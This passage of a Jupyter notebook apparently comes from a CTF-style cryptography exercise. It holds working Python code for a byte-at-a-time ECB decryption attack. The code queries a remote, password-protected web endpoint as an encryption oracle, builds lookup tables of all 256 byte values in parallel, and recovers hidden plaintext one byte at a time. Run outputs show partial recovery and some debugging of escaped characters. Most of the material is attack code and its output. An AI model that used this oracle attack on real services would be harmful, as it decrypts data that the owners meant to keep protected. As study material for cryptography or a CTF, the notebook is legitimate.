    "header = b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e'\n",
    "len(a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "progress: 0\n",
      "trying craft_input_dict. header: b'aaaaaaaaaaaaaaa' 15\n",
      "error in new_oracle\n",
      "input_dict: 250\n",
      "output: b'%'\n",
      "current result: b'aaaaaaaaaaaaaaa%'\n",
      "progress: 1\n",
      "trying craft_input_dict. header: b'aaaaaaaaaaaaaa%' 15\n",
      "input_dict: 250\n",
      "not found.\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'%'"
      ]
     },
     "execution_count": 49,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "block_size = 16\n",
    "\n",
    "global_input_dicts = []\n",
    "\n",
    "def new_oracle(plain_bytes: bytes) -> bytes:\n",
    "    header = b'a' * 10\n",
    "    param = {\"query\": header + plain_bytes}\n",
    "    try:\n",
    "        res = requests.get(url, auth=auth, params=param)\n",
    "        if res.status_code != 200:\n",
    "            print(f'status code in new_oracle: {res.status_code}')\n",
    "            return new_oracle(plain_bytes)\n",
    "    except:\n",
    "        print('error in new_oracle')\n",
    "        return new_oracle(plain_bytes)\n",
    "    encrypted_b64 = res.url.split('query=')[1]\n",
    "    encrypted_bytes = base64.b64decode(urllib.parse.unquote(encrypted_b64))\n",
    "    # print(len(header + plain_bytes), encrypted_bytes)\n",
    "    # print(encrypted_bytes[:48], encrypted_bytes[48:])\n",
    "    return encrypted_bytes[48:48+block_size]\n",
    "\n",
    "def craft_input_dict(header: bytes) -> dict:\n",
    "    input_dict = {}\n",
    "    candidate_list = list(range(256))\n",
    "\n",
    "    def task():\n",
    "        while candidate_list:\n",
    "            i = candidate_list.pop()\n",
    "            encrypted_bytes = new_oracle(header + bytes([i]))\n",
    "            input_dict[encrypted_bytes] = bytes([i])\n",
    "\n",
    "    run_task(task, 10)\n",
    "\n",
    "    return input_dict\n",
    "\n",
    "def match_output():\n",
    "    global global_input_dicts\n",
    "    header = b'a' * (block_size - 1)\n",
    "    result = header\n",
    "\n",
    "    for i in range(block_size):\n",
    "        print(f'progress: {i}')\n",
    "        print(f'trying craft_input_dict. header: {header} {len(header)}')\n",
    "        input_dict = craft_input_dict(header)\n",
    "        global_input_dicts.append(input_dict)\n",
    "        print(f'input_dict: {len(input_dict)}')\n",
    "        encrypted_byte = new_oracle(b'a' * (block_size - 1 - i))\n",
    "        if encrypted_byte in input_dict:\n",
    "            output = input_dict[encrypted_byte]\n",
    "            print(f'output: {output}')\n",
    "        else:\n",
    "            print('not found.')\n",
    "            return result[block_size - 1:]\n",
    "        result += output\n",
    "        header = result[-block_size+1:]\n",
    "        print(f'current result: {result}')\n",
    "\n",
    "    return result\n",
    "\n",
    "#result = match_output()\n",
    "#print(result)\n",
    "\n",
    "\n",
    "match_output()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "dict_values([b'\\xf9', b'\\xfa', b'\\xff', b'\\xf8', b'\\xfe', b'\\xf6', b'\\xfc', b'\\xfd', b'\\xf7', b'\\xfb', b'\\xf5', b'\\xf2', b'\\xef', b'\\xed', b'\\xf1', b'\\xee', b'\\xec', b'\\xf0', b'\\xf4', b'\\xf3', b'\\xeb', b'\\xe9', b'\\xe2', b'\\xea', b'\\xe4', b'\\xe6', b'\\xe3', b'\\xe7', b'\\xe8', b'\\xe5', b'\\xe1', b'\\xde', b'\\xdf', b'\\xe0', b'\\xda', b'\\xdd', b'\\xdb', b'\\xdc', b'\\xd8', b'\\xd9', b'\\xd7', b'\\xd0', b'\\xd4', b'\\xd6', b'\\xd5', b'\\xd1', b'\\xd3', b'\\xd2', b'\\xcf', b'\\xce', b'\\xcd', b'\\xcc', b'\\xcb', b'\\xc7', b'\\xc8', b'\\xc4', b'\\xc9', b'\\xc6', b'\\xca', b'\\xc5', b'\\xc3', b'\\xc2', b'\\xc1', b'\\xc0', b'\\xbd', b'\\xbc', b'\\xba', b'\\xbf', b'\\xbe', b'\\xbb', b'\\xb9', b'\\xb8', b'\\xb7', b'\\xb6', b'\\xb5', b'\\xb4', b'\\xb3', b'\\xb0', b'\\xb2', b'\\xb1', b'\\xaf', b'\\xae', b'\\xac', b'\\xad', b'\\xaa', b'\\xab', b'\\xa9', b'\\xa7', b'\\xa6', b'\\xa8', b'\\xa5', b'\\xa4', b'\\xa3', b'\\xa2', b'\\xa1', b'\\x9f', b'\\x9d', b'\\x9e', b'\\x9c', b'\\x9a', b'\\x9b', b'\\x99', b'\\x98', b'\\xa0', b'\\x97', b'\\x96', b'\\x95', b'\\x93', b'\\x94', b'\\x91', b'\\x92', b'\\x90', b'\\x8e', b'\\x8f', b'\\x8d', b'\\x8a', b'\\x8c', b'\\x8b', b'\\x89', b'\\x87', b'\\x88', b'\\x86', b'\\x85', b'\\x84', b'\\x83', b'\\x81', b'\\x82', b'\\x80', b'\\x7f', b'}', b'~', b'|', b'{', b'z', b'y', b'w', b'v', b'x', b'u', b's', b't', b'r', b'p', b'q', b'o', b'n', b'm', b'l', b'k', b'j', b'i', b'h', b'g', b'f', b'e', b'd', b'c', b'b', b'a', b'`', b'_', b']', b'^', b'[', b\"'\", b'Z', b'X', b'Y', b'W', b'V', b'U', b'T', b'S', b'R', b'Q', b'P', b'N', b'O', b'M', b'L', b'K', b'J', b'I', b'H', b'F', b'G', b'E', b'C', b'B', b'A', b'@', b'?', b'>', b'=', b'<', b';', b':', b'D', b'8', b'9', b'7', b'5', b'3', b'4', b'2', b'1', b'0', b'/', b'.', b'-', b',', b')', b'+', b'(', b'&', b'%', b'$', b'#', b'!', b' ', b'*', b'\\x1e', b'\\x1d', b'\\x1c', b'\\x1b', b'\\x18', b'\\x17', b'\\x16', b'\\x13', b'\\x12', b'\\x0f', b'\\x0e', b'\\x0c', b'\\x0b', b'6', b'\\t', b'\\x1f', b'\\x19', b'\\x08', b'\\x07', b'\\x15', b'\\x14', b'\\x05', b'\\x06', b'\\x04', b'\\x11', b'\\x10', b'\\x03', b'\\x02', b'\\x01'])\n",
      "b'\\x00'\n",
      "b'\\n'\n",
      "b'\\r'\n",
      "b'\\x1a'\n",
      "b'\"'\n",
      "b'\\\\'\n"
     ]
    }
   ],
   "source": [
    "input_dict = global_input_dicts[0]\n",
    "print(input_dict.values())\n",
    "\n",
    "for i in range(256):\n",
    "    if bytes([i]) not in input_dict.values():\n",
    "        print(bytes([i]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\xee\\xdc\\x99\\x8e\\x86\\\\rH\\x86\\x87`&\\xcf\\xe4\\xcap'\n",
      "b'\\xee\\xdc\\x99\\x8e\\x86\\\\rH\\x86\\x87`&\\xcf\\xe4\\xcap'\n",
      "b'\\xee\\xdc\\x99\\x8e\\x86\\\\rH\\x86\\x87`&\\xcf\\xe4\\xcap'\n",
      "b'\\xee\\xdc\\x99\\x8e\\x86\\\\rH\\x86\\x87`&\\xcf\\xe4\\xcap'\n",
      "b'\\xee\\xdc\\x99\\x8e\\x86\\\\rH\\x86\\x87`&\\xcf\\xe4\\xcap'\n",
      "b'\\xee\\xdc\\x99\\x8e\\x86\\\\rH\\x86\\x87`&\\xcf\\xe4\\xcap'\n"
     ]
    }
   ],
   "source": [
    "print(new_oracle(b'a' * 15 + b'\\x00'))\n",
    "print(new_oracle(b'a' * 15 + b'\\n'))\n",
    "print(new_oracle(b'a' * 15 + b'\\r'))\n",
    "print(new_oracle(b'a' * 15 + b'\\x1a'))\n",
    "print(new_oracle(b'a' * 15 + b'\\\"'))\n",
    "print(new_oracle(b'a' * 15 + b'\\\\'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b\"'\""
      ]
     },
     "execution_count": 61,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "input_dict[b'\\xee\\xdc\\x99\\x8e\\x86\\\\rH\\x86\\x87`&\\xcf\\xe4\\xcap']"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
